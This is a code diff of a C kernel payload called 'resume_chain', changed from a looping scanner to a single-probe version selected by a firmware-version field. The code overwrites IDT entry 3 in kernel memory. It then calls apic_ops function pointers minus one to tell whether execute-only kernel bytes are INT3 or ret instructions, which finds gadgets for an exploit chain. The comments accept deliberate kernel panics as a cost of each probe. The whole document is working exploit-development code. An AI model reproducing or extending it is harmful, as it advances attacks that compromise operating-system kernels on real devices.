@@ -1,36 +1,41 @@
 #include <stdint.h>
 
 /*
- * resume_chain v8e — execution-based CC byte scanner
+ * resume_chain v8f — single-probe CC byte scanner
  *
- * For each apic_ops entry, CALLs fn-1 with sentinel in RAX:
+ * Probes ONE apic_ops entry per deployment, selected by fw_ver.
+ * fw_ver = 0xEE00 + entry_index (0..27)
+ *
+ * For the selected entry, CALLs fn-1 with sentinel in RAX:
  *   - If fn-1 = CC (INT3): IDT[3]=doreti_iret catches it, fn executes, returns
  *   - If fn-1 = C3 (ret):  immediate return, RAX = sentinel (unchanged)
- *   - If fn-1 = other:     unpredictable, pcb_onfault catches faults
+ *   - If fn-1 = other:     kernel panic (reboot, try next candidate)
  *
  * ktext is XOM — cannot read bytes. Must EXECUTE to identify them.
+ * pcb_onfault only catches #PF, NOT #UD/#GP — so non-CC/non-C3 = panic.
+ * Single-probe-per-deployment limits blast radius to one reboot.
  *
- * Output layout:
+ * Output layout (all in args buffer, 64 uint64_t slots):
  *   out[0]     = MAGIC (lo32) + status (hi32)
  *   out[1]     = kdata_base
  *   out[2]     = ktext_base
  *   out[3]     = td_pcb
- *   out[4..31] = apic_ops fn ptrs (from kdata, safe)
+ *   out[4..31] = apic_ops fn ptrs (from kdata, safe read)
  *   out[32]    = step progress
- *   out[33..60]= call result for each entry (RAX after call)
- *                0xCC000000000000XX = CC detected, fn returned XX
- *                sentinel unchanged = C3 (ret)
- *                0xFAFAFAFA = faulted (pcb_onfault caught)
- *                0x5B5B5B5B = skipped (dangerous entry)
- *   out[61]    = cc_bitmap
- *   out[62]    = c3_bitmap
+ *   out[33]    = target entry index
+ *   out[34]    = target fn ptr
+ *   out[35]    = call result (RAX after call to fn-1)
+ *                sentinel (0xBAD0...) = C3 (ret)
+ *                other value = CC (INT3 → fn executed → RAX changed)
+ *   out[36]    = verdict: 0=unknown, 1=CC, 2=C3
  *   out[63]    = end marker
  *
- * SKIPPED entries (dangerous side effects):
- *   [6]  disable     — disables LAPIC
- *   [8]  ipi_raw     — sends raw IPI to other CPUs
- *   [9]  ipi_vectored — sends IPI
- *   [23] timer_initial_count — may corrupt timer
+ * Recommended probe order (by alignment + safety):
+ *   fw_ver=0xEE02  → [2]  xapic_mode (CONTROL: known C3)
+ *   fw_ver=0xEE18  → [24] timer_current_count (256-byte aligned, read-only)
+ *   fw_ver=0xEE0E  → [14] set_lvt_mode (256-byte aligned)
+ *   fw_ver=0xEE13  → [19] get_timer_freq (32-byte aligned, read-only)
+ *   fw_ver=0xEE0A  → [10] ipi_wait (64-byte aligned)
  */
 
 #define MAGIC_RSCN       0x5253434E
@@ -108,17 +113,19 @@ static void idt_set_handler(uint64_t idt_entry_addr, uint64_t handler, uint8_t i
     write4(idt_entry_addr + 8, (uint32_t)((handler >> 32) & 0xFFFFFFFF));
 }
 
-
 /*
- * Call fn-1 with sentinel in RAX, pcb_onfault for crash recovery.
+ * Call fn-1 with sentinel in RAX.
  * Returns RAX value after the call.
- * On fault: returns 0xFAFAFAFAFAFAFAFA.
+ *
+ * NOTE: pcb_onfault only catches #PF. If fn-1 is not CC or C3,
+ * the resulting #UD/#GP will NOT be caught → kernel panic.
+ * This is expected and acceptable for single-probe-per-deployment.
  */
 static uint64_t probe_fn_minus1(uint64_t fn_minus1, uint64_t onfault_addr)
 {
     uint64_t result;
     __asm__ volatile(
-        /* Arm pcb_onfault for crash recovery */
+        /* Arm pcb_onfault for #PF recovery (won't help with #UD/#GP) */
         "leaq 2f(%%rip), %%rcx\n\t"
         "movq %%rcx, (%[onfault])\n\t"
 
@@ -131,7 +138,7 @@ static uint64_t probe_fn_minus1(uint64_t fn_minus1, uint64_t onfault_addr)
         "movq $0, (%[onfault])\n\t"
         "jmp 1f\n\t"
 
-        /* Fault recovery */
+        /* Fault recovery (only reached on #PF) */
         "2:\n\t"
         "movabsq $0xFAFAFAFAFAFAFAFA, %[result]\n\t"
 
@@ -144,21 +151,17 @@ static uint64_t probe_fn_minus1(uint64_t fn_minus1, uint64_t onfault_addr)
     return result;
 }
 
-/* Entries to skip (dangerous side effects) */
-static int is_dangerous(int i)
-{
-    return (i == 6)   /* disable */
-        || (i == 8)   /* ipi_raw */
-        || (i == 9)   /* ipi_vectored */
-        || (i == 23);  /* timer_initial_count */
-}
-
 int module_start(kproc_args *args)
 {
     uint64_t kdata_base = args->kdata_base;
+    uint32_t fw_ver = args->fw_ver;
     volatile uint64_t *out = (volatile uint64_t *)args;
     volatile uint32_t *out32 = (volatile uint32_t *)args;
 
+    /* Extract target entry index from fw_ver */
+    int target_idx = (int)(fw_ver & 0xFF);
+
+    /* Clear output buffer */
     for (int i = 0; i < 64; i++)
         out[i] = 0;
 
@@ -167,13 +170,16 @@ int module_start(kproc_args *args)
 
     out[1] = kdata_base;
     out[2] = ktext_base;
-
-    /* Write magic EARLY for crash-safe readback */
-    out32[1] = 0x008E;
-    __asm__ volatile("mfence" ::: "memory");
-    out32[0] = MAGIC_RSCN;
-
     out[32] = 0x01;  /* step: starting */
+
+    /* Validate target index */
+    if (target_idx >= APIC_OPS_COUNT) {
+        out[33] = target_idx;
+        out32[1] = 0x00FE;  /* invalid index */
+        __asm__ volatile("mfence" ::: "memory");
+        out32[0] = MAGIC_RSCN;
+        return 0;
+    }
 
     /* Get curthread → td_pcb → onfault_addr */
     uint64_t curthread;
@@ -182,7 +188,9 @@ int module_start(kproc_args *args)
     out[3] = td_pcb;
 
     if (!td_pcb) {
-        out32[1] = 0x00FF;
+        out32[1] = 0x00FF;  /* no PCB */
+        __asm__ volatile("mfence" ::: "memory");
+        out32[0] = MAGIC_RSCN;
         return 0;
     }
 
@@ -194,6 +202,20 @@ int module_start(kproc_args *args)
         out[4 + i] = read8(apic_ops_addr + i * 8);
 
     out[32] = 0x02;  /* step: fn ptrs read */
+
+    /* Get target fn ptr */
+    uint64_t fn = out[4 + target_idx];
+    out[33] = target_idx;
+    out[34] = fn;
+
+    if (fn == 0) {
+        out[35] = 0;
+        out[36] = 0;  /* unknown — NULL fn */
+        out32[1] = 0x01F0;  /* complete, NULL target */
+        __asm__ volatile("mfence" ::: "memory");
+        out32[0] = MAGIC_RSCN;
+        return 0;
+    }
 
     /* Save original IDT[3] (16 bytes) */
     uint64_t idt_base = kdata_base + OFF_IDT;
@@ -207,42 +229,33 @@ int module_start(kproc_args *args)
 
     out[32] = 0x03;  /* step: IDT[3] armed */
 
-    /* Probe each entry */
-    uint64_t cc_bitmap = 0;
-    uint64_t c3_bitmap = 0;
+    /* === SINGLE PROBE === */
+    out[32] = 0x100 + target_idx;  /* step: probing entry */
 
-    for (int i = 0; i < APIC_OPS_COUNT; i++) {
-        uint64_t fn = out[4 + i];
+    uint64_t result = probe_fn_minus1(fn - 1, onfault_addr);
+    out[35] = result;
 
-        if (fn == 0 || is_dangerous(i)) {
-            out[33 + i] = 0x5B5B5B5B5B5B5B5BULL;  /* skipped */
-            continue;
-        }
-
-        out[32] = 0x100 + i;  /* step: probing entry i */
-
-        uint64_t result = probe_fn_minus1(fn - 1, onfault_addr);
-        out[33 + i] = result;
-
-        if (result == SENTINEL) {
-            /* RAX unchanged → fn-1 was C3 (ret) */
-            c3_bitmap |= (1ULL << i);
-        } else if (result != 0xFAFAFAFAFAFAFAFAULL) {
-            /* RAX changed AND didn't fault → fn-1 was CC (INT3 → fn executed) */
-            cc_bitmap |= (1ULL << i);
-        }
+    /* Classify result */
+    if (result == SENTINEL) {
+        out[36] = 2;  /* C3 — ret, sentinel unchanged */
+    } else if (result == 0xFAFAFAFAFAFAFAFAULL) {
+        out[36] = 3;  /* faulted (#PF caught by pcb_onfault) */
+    } else {
+        out[36] = 1;  /* CC — INT3 → doreti_iret → fn executed → RAX changed */
     }
 
     /* Restore original IDT[3] */
     write8(idt3_addr, idt3_orig_lo);
     write8(idt3_addr + 8, idt3_orig_hi);
 
-    out[61] = cc_bitmap;
-    out[62] = c3_bitmap;
-    out[63] = 0xdeadbeefcafe008EULL;
+    out[32] = 0x04;  /* step: IDT restored */
 
-    /* Final status */
-    out32[1] = 0x018E;  /* v8e complete */
+    out[63] = 0xdeadbeefcafe008FULL;
+
+    /* Write magic + status LAST */
+    out32[1] = 0x018F;  /* v8f complete */
+    __asm__ volatile("mfence" ::: "memory");
+    out32[0] = MAGIC_RSCN;
 
     return 0;
 }
